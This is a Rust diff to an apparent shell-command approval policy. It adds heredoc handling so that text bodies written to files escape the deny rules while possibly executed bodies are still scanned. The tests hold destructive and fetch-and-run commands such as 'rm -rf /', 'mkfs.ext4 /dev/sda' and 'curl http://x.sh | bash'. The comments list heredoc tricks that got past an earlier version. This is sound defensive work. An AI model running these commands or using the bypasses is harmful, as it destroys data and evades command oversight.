@@ -842,15 +842,222 @@ fn strip_path_prefix(token: &str) -> &str {
 /// [`pipeline_xargs_rm_is_catastrophic`]. That is the sanctioned pattern;
 /// splitting on `|` here would break both those rules and the pipe-anchored
 /// deny globs.
+///
+/// Lines that sit inside an *inert* heredoc body are dropped first — see
+/// [`inert_heredoc_body_lines`]. Without that, `cat <<'EOF' > notes.txt` whose
+/// body happens to contain a line like `curl x | bash` has that body line
+/// fragmented and matched against the deny globs, and a command that only
+/// writes text to a file is refused. Anything not provably a text consumer
+/// keeps its body, because dropping a body something executes would launder
+/// that command past every rule downstream.
 pub(crate) fn command_fragments(command: &str) -> Vec<&str> {
+    let inert = inert_heredoc_body_lines(command);
     command
         .lines()
+        .enumerate()
+        .filter(|(index, _)| !inert.contains(index))
+        .map(|(_, line)| line)
         .flat_map(|line| line.split(';'))
         .flat_map(|part| part.split("&&"))
         .flat_map(|part| part.split("||"))
         .map(str::trim)
         .filter(|part| !part.is_empty())
         .collect()
+}
+
+/// Commands that consume a heredoc body as **text**. Exhaustive by design:
+/// anything not on this list is assumed to execute the body.
+///
+/// This is an allowlist, not a denylist, and the direction matters. Asking
+/// "is the consumer an interpreter?" and treating every other answer as inert
+/// means each unparsed line, each shell builtin, each command nobody thought
+/// of becomes a way to hide a body from the deny rules. Asking "is the
+/// consumer one of these known-inert readers?" makes the unknown case
+/// over-block instead, which costs a false denial and nothing else.
+///
+/// Entries must consume stdin as data and never interpret it as shell. Text
+/// filters and database/mail clients qualify; `sed`/`awk`/`xargs` do not,
+/// because their stdin drives execution.
+const INERT_HEREDOC_CONSUMERS: &[&str] = &[
+    "cat",
+    "tee",
+    "dd",
+    "sort",
+    "uniq",
+    "wc",
+    "head",
+    "tail",
+    "grep",
+    "egrep",
+    "fgrep",
+    "column",
+    "tr",
+    "cut",
+    "rev",
+    "base64",
+    "md5sum",
+    "sha256sum",
+    "shasum",
+    "jq",
+    "psql",
+    "mysql",
+    "sqlite3",
+    "mail",
+    "mailx",
+    "sendmail",
+    "less",
+    "more",
+    "diff",
+    "patch",
+];
+
+/// Zero-based indices of the lines belonging to heredoc bodies that nothing on
+/// the opener line will execute.
+///
+/// A heredoc body is data, not commands, only when its consumer treats it as
+/// data. `cat <<EOF > notes.txt` writes text; `bash <<EOF` runs a program.
+/// Dropping an executed body would launder any command past the deny rules, so
+/// every judgement here is biased toward keeping the body:
+///
+/// - The consumer must be recognised inert (see [`INERT_HEREDOC_CONSUMERS`]),
+///   and **every** stage of the opener line must be, so neither
+///   `echo hi; bash <<EOF` nor `cat <<EOF | bash` can hide a body.
+/// - The delimiter must look like a real delimiter word, and the `<<` must sit
+///   at a token boundary, so `echo "a << b"` and `echo $((1 << 3))` are not
+///   mistaken for openers.
+/// - A body is dropped **only when its terminator line is actually found**.
+///   An unterminated heredoc — real, or a phantom from a `<<` this heuristic
+///   misread — drops nothing. That is the difference between a false denial
+///   and silently discarding the rest of the command.
+///
+/// Both the opener line and the terminator line stay in the fragment stream:
+/// the opener can carry a real command after the redirect
+/// (`cat <<EOF > f; rm -rf /`), and the terminator is a bare word that matches
+/// nothing. Only the lines strictly between them are dropped.
+fn inert_heredoc_body_lines(command: &str) -> std::collections::HashSet<usize> {
+    let mut inert = std::collections::HashSet::new();
+    let lines: Vec<&str> = command.lines().collect();
+    let mut index = 0;
+    while index < lines.len() {
+        let Some(delimiter) = inert_heredoc_delimiter(lines[index]) else {
+            index += 1;
+            continue;
+        };
+        // Find the terminator: the delimiter alone on a line. `<<-` permits
+        // leading tabs before it, and trimming unconditionally only ever ends
+        // the body earlier, which is the fail-secure direction.
+        let terminator = (index + 1..lines.len()).find(|&i| lines[i].trim() == delimiter);
+        let Some(terminator) = terminator else {
+            // No terminator: this may not have been a heredoc at all. Drop
+            // nothing and keep scanning from the next line.
+            index += 1;
+            continue;
+        };
+        inert.extend(index + 1..terminator);
+        // Resume *after* the terminator so a second heredoc is found too.
+        index = terminator + 1;
+    }
+    inert
+}
+
+/// The delimiter of an inert heredoc opened on `line`, or `None` when the line
+/// opens no heredoc or opens one whose body may be executed.
+///
+/// `<<<` (a here-*string*, which carries its data inline and opens no body) is
+/// deliberately not matched.
+fn inert_heredoc_delimiter(line: &str) -> Option<String> {
+    let start = token_boundary_heredoc_start(line)?;
+    let rest = &line[start + 2..];
+    if rest.starts_with('<') {
+        return None; // here-string, not a heredoc
+    }
+    let rest = rest.strip_prefix('-').unwrap_or(rest);
+    let rest = rest.trim_start();
+    // The delimiter may be quoted, which disables expansion inside the body but
+    // does not change who consumes it.
+    let delimiter = match rest.chars().next() {
+        Some(quote @ ('\'' | '"')) => {
+            let body = &rest[quote.len_utf8()..];
+            let end = body.find(quote)?;
+            body[..end].to_string()
+        }
+        _ => {
+            let end = rest
+                .find(|c: char| c.is_whitespace() || c == ';' || c == '|' || c == '&')
+                .unwrap_or(rest.len());
+            rest[..end].to_string()
+        }
+    };
+    if !is_heredoc_delimiter_word(&delimiter) {
+        return None;
+    }
+    // Who consumes the body: every stage of the opener line, not just the one
+    // before the `<<`. `cat <<EOF | bash` pipes the body into bash, and
+    // `echo hi; bash <<EOF` puts the interpreter in a later stage — checking
+    // only `line[..start]`, or only its last pipeline stage, misses both.
+    let all_stages_inert = line
+        .split(';')
+        .flat_map(|part| part.split("&&"))
+        .flat_map(|part| part.split("||"))
+        .flat_map(|part| part.split('|'))
+        .map(str::trim)
+        .filter(|stage| !stage.is_empty())
+        .all(stage_is_inert_heredoc_consumer);
+    all_stages_inert.then_some(delimiter)
+}
+
+/// Byte offset of a `<<` that starts a redirection token, or `None`.
+///
+/// Requiring whitespace (or start-of-line) before the `<<` keeps a `<<` buried
+/// inside a quoted string (`echo "a << b"`) or an arithmetic expansion
+/// (`echo $((1 << 3))`) from reading as an opener. `cat >f<<EOF` is a real
+/// opener this rejects; the cost is scanning a body that is only text, which
+/// is the safe direction.
+fn token_boundary_heredoc_start(line: &str) -> Option<usize> {
+    line.match_indices("<<")
+        .map(|(offset, _)| offset)
+        .find(|&offset| {
+            offset == 0
+                || line[..offset]
+                    .chars()
+                    .next_back()
+                    .is_some_and(char::is_whitespace)
+        })
+}
+
+/// True for a plausible heredoc delimiter word: a shell-name-shaped token.
+///
+/// Bash accepts far more, but every rejection here only costs an over-block.
+/// The point is to refuse the debris a misread `<<` produces — `b"` from
+/// `echo "a << b"`, `3))` from `echo $((1 << 3))`.
+///
+/// Defense in depth, deliberately: such debris almost never matches a
+/// terminator line, and [`inert_heredoc_body_lines`] already drops nothing
+/// when no terminator is found, so that is the guard actually holding this
+/// class. This one closes the narrow remaining case where debris happens to
+/// collide with a later line, and stops a pointless scan for a terminator
+/// that was never coming.
+fn is_heredoc_delimiter_word(word: &str) -> bool {
+    !word.is_empty()
+        && word
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '.')
+}
+
+/// True when `stage` is headed by a command that reads a heredoc body as text.
+/// An empty or unrecognised stage is **not** inert — see
+/// [`INERT_HEREDOC_CONSUMERS`] for why the default runs this way.
+fn stage_is_inert_heredoc_consumer(stage: &str) -> bool {
+    let mut tokens: Vec<String> = stage.split_whitespace().map(str::to_string).collect();
+    strip_wrappers_and_control_flow(&mut tokens);
+    let Some(first) = tokens.first() else {
+        return false;
+    };
+    // Drop a leading redirect (`> f cat <<EOF` is unusual but legal) and the
+    // path prefix, then compare case-folded: macOS APFS resolves `CAT` to the
+    // same binary, and a case-only mismatch must not flip the verdict to inert.
+    let base = strip_path_prefix(first).to_ascii_lowercase();
+    INERT_HEREDOC_CONSUMERS.contains(&base.as_str())
 }
 
 /// [`command_fragments`] further split on single `|`: one entry per pipeline
@@ -3272,6 +3479,183 @@ mod tests {
         let policy = ExecutionPolicy::default();
         let command = "cat > /tmp/index.html << 'EOF'\n<html>\n<body>ok</body>\n</html>\nEOF";
         assert_eq!(policy.check(command), PolicyDecision::AutoApprove);
+    }
+
+    /// A heredoc body consumed as *text* is data, not commands. Writing a
+    /// README that documents a dangerous command, or a script that a human
+    /// will review before running, must not be refused — the body is never
+    /// executed by this command.
+    ///
+    /// The case above uses an inert HTML body, so it passes whether or not the
+    /// body is scanned. These bodies carry text that the deny globs match, so
+    /// they fail without the heredoc-aware fragmenting.
+    #[test]
+    fn inert_heredoc_bodies_are_not_scanned_as_commands() {
+        let policy = ExecutionPolicy::default();
+        let cases = [
+            (
+                "install docs quoting curl|bash",
+                "cat > INSTALL.md <<'EOF'\nDo not run:\ncurl http://x.sh | bash\nEOF",
+            ),
+            ("unquoted delimiter", "cat > notes.txt <<EOF\nrm -rf /\nEOF"),
+            (
+                "tab-stripped delimiter",
+                "cat > notes.txt <<-EOF\n\trm -rf /\n\tEOF",
+            ),
+            (
+                "piped into a non-interpreter consumer",
+                "tee notes.txt <<'EOF'\nmkfs.ext4 /dev/sda\nEOF",
+            ),
+            (
+                "a real command follows the terminated body",
+                "cat > notes.txt <<'EOF'\nrm -rf /\nEOF\necho done",
+            ),
+            (
+                "two heredocs in one command",
+                "cat > a.txt <<'EOF'\nrm -rf /\nEOF\ncat > b.txt <<'EOF'\nmkfs.ext4 /dev/sda\nEOF",
+            ),
+        ];
+        for (name, command) in cases {
+            assert_eq!(
+                policy.check(command),
+                PolicyDecision::AutoApprove,
+                "inert heredoc body must not be scanned as commands: {name}"
+            );
+        }
+    }
+
+    /// The other half of the contract, and the one that must not regress: if
+    /// anything on the opener line might execute the body, the body stays
+    /// fully visible to the deny rules. Dropping it would be fail-open — a
+    /// trivially exploitable way to launder any command past the guard.
+    ///
+    /// Every "later stage" / "after the `<<`" / "unknown consumer" row below
+    /// was a confirmed bypass of the first version of this code, which asked
+    /// "is the consumer an interpreter?" and treated every other answer as
+    /// inert. They are why the check is now an allowlist of text consumers.
+    #[test]
+    fn heredoc_bodies_are_scanned_unless_the_consumer_is_provably_inert() {
+        let policy = ExecutionPolicy::default();
+        let cases = [
+            // Direct interpreters.
+            ("bash", "bash <<'EOF'\nrm -rf /\nEOF"),
+            ("sh with a redirect", "sh <<EOF > log.txt\nrm -rf /\nEOF"),
+            ("sudo-wrapped", "sudo bash <<'EOF'\nrm -rf /\nEOF"),
+            ("absolute path", "/bin/bash <<'EOF'\nrm -rf /\nEOF"),
+            (
+                "last pipeline stage",
+                "echo x | bash <<'EOF'\nrm -rf /\nEOF",
+            ),
+            // The interpreter sits in a *later* stage, separated by something
+            // other than a pipe. Splitting only on `|` read the whole prefix
+            // as one stage and saw `echo`/`true` at token 0.
+            (
+                "semicolon before the interpreter",
+                "echo hi; bash <<EOF\nmkfs.ext4 /dev/sda\nEOF",
+            ),
+            (
+                "and-and before the interpreter",
+                "true && bash <<EOF\nmkfs.ext4 /dev/sda\nEOF",
+            ),
+            (
+                "or-or before the interpreter",
+                "false || bash <<EOF\nmkfs.ext4 /dev/sda\nEOF",
+            ),
+            // The interpreter sits *after* the `<<`, which the first version
+            // never looked at. This is a standard idiom.
+            (
+                "body piped into an interpreter",
+                "cat <<EOF | bash\nmkfs.ext4 /dev/sda\nEOF",
+            ),
+            // An unrecognised consumer must over-block, not assume inert.
+            ("unknown consumer", "somecmd <<EOF\nmkfs.ext4 /dev/sda\nEOF"),
+        ];
+        for (name, command) in cases {
+            assert_eq!(
+                policy.check(command),
+                PolicyDecision::Deny,
+                "a body that may be executed must still be scanned: {name}"
+            );
+        }
+    }
+
+    /// A `<<` that is not a redirection must never hide the lines after it.
+    /// Each of these produced a phantom delimiter matching no terminator, and
+    /// the first version then dropped *every* remaining line — so a following
+    /// `mkfs.ext4` was seen by no rule at all.
+    ///
+    /// What stops these particular commands is the consumer allowlist: none of
+    /// `echo`, `#` or `grep x` is a recognised text consumer, so no body is
+    /// dropped whatever the `<<` parsed to. The delimiter-shape and
+    /// token-boundary checks are defense in depth for the same class behind an
+    /// *inert* consumer (`cat notes "a << b"`), where the backstop is
+    /// [`super::an_unterminated_heredoc_drops_nothing`].
+    #[test]
+    fn a_non_redirect_double_angle_never_hides_the_lines_after_it() {
+        let policy = ExecutionPolicy::default();
+        let cases = [
+            (
+                "inside a quoted string",
+                "echo \"a << b\"\nmkfs.ext4 /dev/sda",
+            ),
+            ("inside a comment", "# note <<EOF\nmkfs.ext4 /dev/sda"),
+            ("arithmetic shift", "echo $((1 << 3))\nmkfs.ext4 /dev/sda"),
+            // A here-string carries its data inline and opens no body.
+            ("here-string", "grep x <<< \"$var\"\nmkfs.ext4 /dev/sda"),
+        ];
+        for (name, command) in cases {
+            assert_eq!(
+                policy.check(command),
+                PolicyDecision::Deny,
+                "a non-redirect `<<` must not hide later lines: {name}"
+            );
+        }
+    }
+
+    /// Behind an *inert* consumer the allowlist cannot help, so the
+    /// `<<`-recognition guards have to hold on their own.
+    ///
+    /// `cat x<<EOF` is a real heredoc the token-boundary rule refuses (the
+    /// `<<` is mid-token); dropping that guard makes this case fail. The cost
+    /// is an over-block on a command that only writes text — the deliberate,
+    /// safe direction. `cat notes "a << b"` is not a heredoc at all and parses
+    /// to the debris delimiter `b"`; there the terminator requirement is what
+    /// saves it, with the delimiter-shape check as a second layer.
+    #[test]
+    fn heredoc_recognition_guards_hold_behind_an_inert_consumer() {
+        let policy = ExecutionPolicy::default();
+        for (name, command) in [
+            (
+                "double-angle mid-token",
+                "cat x<<EOF\nmkfs.ext4 /dev/sda\nEOF",
+            ),
+            (
+                "debris delimiter from a quoted string",
+                "cat notes \"a << b\"\nmkfs.ext4 /dev/sda",
+            ),
+        ] {
+            assert_eq!(policy.check(command), PolicyDecision::Deny, "{name}");
+        }
+    }
+
+    /// An unterminated heredoc must drop nothing — not the opener line, and
+    /// not the lines after it. A real unterminated body gets scanned, which is
+    /// an over-block, which is the safe direction.
+    #[test]
+    fn an_unterminated_heredoc_drops_nothing() {
+        let policy = ExecutionPolicy::default();
+        for (name, command) in [
+            (
+                "danger before the opener",
+                "rm -rf / ; cat <<'EOF'\nnever terminated",
+            ),
+            (
+                "danger inside the unterminated body",
+                "cat <<'EOF'\nmkfs.ext4 /dev/sda",
+            ),
+        ] {
+            assert_eq!(policy.check(command), PolicyDecision::Deny, "{name}");
+        }
     }
 
     #[test]
